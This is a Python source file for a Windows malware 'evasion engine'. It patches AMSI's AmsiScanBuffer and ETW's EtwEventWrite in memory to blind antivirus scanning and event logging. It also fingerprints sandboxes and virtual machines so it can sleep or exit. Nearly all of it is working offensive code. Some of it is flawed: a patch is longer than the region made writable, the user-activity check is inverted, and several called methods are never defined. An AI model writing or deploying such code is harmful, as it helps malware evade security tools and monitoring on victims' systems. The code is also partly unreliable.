import ctypes, ctypes.wintypes
import sys, os, platform, random, hashlib, time, inspect

class EvasionEngine:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.user32 = ctypes.windll.user32
        self.amsi_dll = None
        self.etw_providers = []
        
    def execute_evasion_routines(self):
        """Run all evasion techniques."""
        self.patch_amsi()
        self.patch_etw()
        self.check_and_evade_sandbox()
        self.check_and_evade_vm()
        self.check_debugger()
        self.spoof_parent_process()
        self.hide_from_pe_analysis()
        
    def patch_amsi(self):
        """Bypass AMSI by patching AmsiScanBuffer in memory."""
        try:
            # Load AMSI DLL
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            
            # Get address of AmsiScanBuffer
            scan_buffer_addr = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value
            
            # Make memory region writable
            old_protect = ctypes.c_ulong(0)
            self.kernel32.VirtualProtect(scan_buffer_addr, 5, 0x40, ctypes.byref(old_protect))
            
            # Patch with return 0x80070057 (E_INVALIDARG) - AMSI_RESULT_CLEAN
            patch = b"\xB8\x57\x00\x07\x80\xC3"  # mov eax, 0x80070057; ret
            ctypes.memmove(scan_buffer_addr, patch, len(patch))
            
            # Restore protection
            self.kernel32.VirtualProtect(scan_buffer_addr, 5, old_protect, ctypes.byref(old_protect))
            
            return True
        except:
            return False
    
    def patch_etw(self):
        """Bypass Event Tracing for Windows."""
        try:
            # Method 1: Patch EtwEventWrite
            ntdll = ctypes.windll.ntdll
            etw_event_write = ntdll.EtwEventWrite
            
            old_protect = ctypes.c_ulong(0)
            self.kernel32.VirtualProtect(etw_event_write, 4, 0x40, ctypes.byref(old_protect))
            
            # Return success immediately
            patch = b"\xC2\x14\x00"  # ret 0x14
            ctypes.memmove(etw_event_write, patch, 3)
            
            self.kernel32.VirtualProtect(etw_event_write, 4, old_protect, ctypes.byref(old_protect))
            return True
        except:
            return False
    
    def check_and_evade_sandbox(self):
        """Detect and evade sandbox environments."""
        indicators = []
        
        # 1. Check for low resources
        mem = self.kernel32.GlobalMemoryStatusEx
        mem_struct = ctypes.create_string_buffer(64)
        ctypes.memset(mem_struct, 0, 64)
        ctypes.cast(mem_struct, ctypes.POINTER(ctypes.c_ulong))[0] = 64
        mem(mem_struct)
        
        total_ram = ctypes.cast(mem_struct, ctypes.POINTER(ctypes.c_ulonglong))[1] / (1024**3)
        if total_ram < 2:  # Less than 2GB RAM
            indicators.append("Low RAM")
        
        # 2. Check CPU cores
        import multiprocessing
        if multiprocessing.cpu_count() < 2:
            indicators.append("Single CPU core")
        
        # 3. Check for sandbox-specific processes
        sandbox_processes = ['vmsrvc', 'vmusrvc', 'vboxtray', 'vmtoolsd', 
                            'prl_tools', 'prl_cc', 'xenservice', 'qemu-ga']
        
        from ctypes.wintypes import DWORD, MAX_PATH
        PROCESS_QUERY_INFORMATION = 0x0400
        PROCESS_VM_READ = 0x0010
        
        hSnapshot = self.kernel32.CreateToolhelp32Snapshot(0x00000002, 0)  # TH32CS_SNAPPROCESS
        if hSnapshot:
            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [("dwSize", DWORD),
                           ("cntUsage", DWORD),
                           ("th32ProcessID", DWORD),
                           ("th32DefaultHeapID", ctypes.POINTER(DWORD)),
                           ("th32ModuleID", DWORD),
                           ("cntThreads", DWORD),
                           ("th32ParentProcessID", DWORD),
                           ("pcPriClassBase", DWORD),
                           ("dwFlags", DWORD),
                           ("szExeFile", ctypes.c_char * MAX_PATH)]
            
            pe32 = PROCESSENTRY32()
            pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
            
            if self.kernel32.Process32First(hSnapshot, ctypes.byref(pe32)):
                while True:
                    exe_name = pe32.szExeFile.decode('latin-1').lower()
                    for sb_proc in sandbox_processes:
                        if sb_proc in exe_name:
                            indicators.append(f"Sandbox process: {exe_name}")
                    
                    if not self.kernel32.Process32Next(hSnapshot, ctypes.byref(pe32)):
                        break
            
            self.kernel32.CloseHandle(hSnapshot)
        
        # 4. Check uptime
        uptime = self.kernel32.GetTickCount() / 1000 / 60 / 60  # Hours
        if uptime < 1:
            indicators.append("Short uptime")
        
        # 5. Check for human interaction
        last_input_info = ctypes.create_string_buffer(28)
        ctypes.memset(last_input_info, 0, 28)
        ctypes.cast(last_input_info, ctypes.POINTER(ctypes.c_ulong))[0] = 28
        
        if self.user32.GetLastInputInfo(last_input_info):
            last_input = ctypes.cast(last_input_info, ctypes.POINTER(ctypes.c_ulong))[1]
            idle_time = (self.kernel32.GetTickCount() - last_input) / 1000 / 60  # Minutes
            if idle_time < 1:
                indicators.append("Recent user activity")
        
        # If too many indicators, sleep or exit
        if len(indicators) >= 3:
            time.sleep(random.randint(300, 600))  # Sleep 5-10 minutes
            if len(indicators) >= 5:
                sys.exit(0)  # Bail out
        
        return indicators